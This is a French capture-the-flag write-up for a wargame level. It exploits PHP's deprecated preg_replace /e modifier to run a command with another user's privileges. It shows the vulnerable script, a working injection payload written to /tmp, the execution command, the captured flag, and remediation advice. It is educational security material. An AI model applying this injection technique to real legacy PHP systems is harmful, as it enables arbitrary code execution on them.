# Rapport de Vulnérabilité : Exécution de commande via injection dans une évaluation de regex en PHP

## Description

Dans ce niveau, un binaire exécutable appartenant à `flag06` lit un fichier contenant une expression spéciale, puis le passe à un script PHP (`level06.php`) vulnérable. Ce script utilise une vieille fonction de **regex avec évaluation de code (`preg_replace /e`)**, qui permet l’exécution arbitraire de code PHP. En injectant une expression bien formée, il est possible de faire exécuter une commande système comme `getflag`.

## Comment Exploiter la Faille

### Étape 1 : Analyse du script PHP

Fichier `/home/user/level06/level06.php` :

```php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}

function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
```

La ligne vulnérable est :

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

L’option `/e` dans `preg_replace` exécute le résultat du remplacement comme du **code PHP**. Cela permet d’injecter et d’exécuter du code PHP via le contenu du fichier passé en paramètre.

### Étape 2 : Création du fichier d’injection

On crée un fichier dans `/tmp` avec le contenu suivant :

```bash
echo '[x ${`getflag`};]' > /tmp/playload
```

* `${`getflag`}` est une syntaxe PHP valide permettant d’exécuter une commande système
* L’évaluation via `/e` va transformer cette ligne en un appel effectif à `getflag`

### Étape 3 : Exécution du binaire

Le binaire `level06` exécute le script PHP avec les droits de `flag06`. Il suffit de le lancer en lui donnant notre fichier en argument :

```bash
./level06 /tmp/playload
```

### Étape 4 : Récupération du flag

Le flag est affiché dans la sortie :

```
wiok45aaoguiboiki2tuin6ub
```

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Ne jamais utiliser l’option `/e` dans `preg_replace`** : Elle est obsolète et dangereuse (supprimée en PHP 7).
* **Utiliser des alternatives sûres** : Par exemple, `preg_replace_callback()` avec une fonction anonyme bien contrôlée.
* **Éviter toute évaluation dynamique** de contenu externe (fichier, entrée utilisateur…).
* **Séparer le traitement logique des entrées utilisateur** du reste de l’application.

## Conclusion

Ce niveau illustre une faille classique d’**exécution de code via une expression régulière mal sécurisée**. L’utilisation de fonctionnalités obsolètes comme `/e` dans `preg_replace` ouvre la voie à l'exécution arbitraire de commandes. C’est un excellent exemple des risques liés à une mauvaise gestion des entrées utilisateur dans des langages dynamiques comme PHP.

---
